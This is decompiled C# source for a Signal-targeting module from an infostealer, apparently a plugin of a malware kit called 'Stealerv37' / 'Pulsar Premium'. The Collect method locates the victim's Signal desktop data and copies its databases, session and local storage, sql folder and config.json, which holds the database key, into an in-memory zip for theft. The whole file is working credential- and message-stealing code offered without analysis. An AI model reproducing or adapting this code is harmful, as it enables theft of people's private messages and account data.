// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Signal
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Signal : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), nameof (Signal));
    if (!Directory.Exists(str1))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Signal);
    string[] strArray = new string[4]
    {
      "databases",
      "Session Storage",
      "Local Storage",
      "sql"
    };
    foreach (string path2 in strArray)
    {
      string str2 = Path.Combine(str1, path2);
      if (Directory.Exists(str2))
      {
        string targetEntryDirectory = Path.Combine(nameof (Signal), path2);
        zip.AddDirectoryFiles(str2, targetEntryDirectory);
        counterApplications.Files.Add($"{str2} => {targetEntryDirectory}");
      }
    }
    string path = Path.Combine(str1, "config.json");
    if (File.Exists(path))
    {
      string entryPath = Path.Combine(nameof (Signal), "config.json");
      zip.AddFile(entryPath, File.ReadAllBytes(path));
      counterApplications.Files.Add($"{path} => {entryPath}");
      counterApplications.Files.Add(entryPath);
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("Signal\\");
    counter.Messangers.Add(counterApplications);
  }
}
